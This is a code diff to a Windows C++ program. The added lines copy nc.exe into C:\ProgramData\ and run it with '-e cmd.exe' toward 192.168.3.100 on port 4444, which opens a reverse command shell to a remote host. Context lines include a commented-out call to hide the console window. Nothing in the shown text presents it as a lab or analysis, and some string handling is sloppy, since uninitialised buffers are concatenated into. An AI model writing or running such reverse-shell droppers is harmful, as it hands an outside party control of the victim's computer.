@@ -1,6 +1,7 @@
 #include <iostream>
 #include <tchar.h>
 #include <windows.h>
+#include <fstream>
 
 #define INFO_BUFFER_SIZE 32767
 
@@ -39,6 +40,38 @@ int main(int argc, char *argv[])
     {
         printf("Could not copy file!");
     }
+
+    TCHAR currentPath[INFO_BUFFER_SIZE] ;
+    GetCurrentDirectory(INFO_BUFFER_SIZE, currentPath);
+    TCHAR mainPath[INFO_BUFFER_SIZE] = _T("C:\\ProgramData\\");
+    TCHAR ncCurrentPath[INFO_BUFFER_SIZE];
+    TCHAR ncDestinationPath[INFO_BUFFER_SIZE];
+    _tcscat(ncCurrentPath, currentPath);
+    _tcscat(ncCurrentPath, _T("\\nc.exe"));
+    _tcscat(ncDestinationPath, mainPath);
+    _tcscat(ncDestinationPath, _T("nc.exe"));
+
+    std::cout <<std::endl<< ncCurrentPath << " -> " << ncDestinationPath << std::endl;
+
+    if (CopyFile(ncCurrentPath, ncDestinationPath, TRUE))
+    {
+        printf("Copied file");
+    }
+    else
+    {
+        printf("Could not copy file!");
+    }
+
+
+    TCHAR command[INFO_BUFFER_SIZE];
+    _tcscat(command, ncDestinationPath);
+    _tcscat(command, _T(" -zvv 192.168.3.100 4444 -e cmd.exe > text.txt"));
+    char cCommand[INFO_BUFFER_SIZE];
+    strcpy(cCommand, command);
+
+
+    std::cout << std::endl << cCommand << std::endl;
+    std::system(cCommand);
 
     // HWND self = GetConsoleWindow();
     // ShowWindow(self, SW_HIDE);
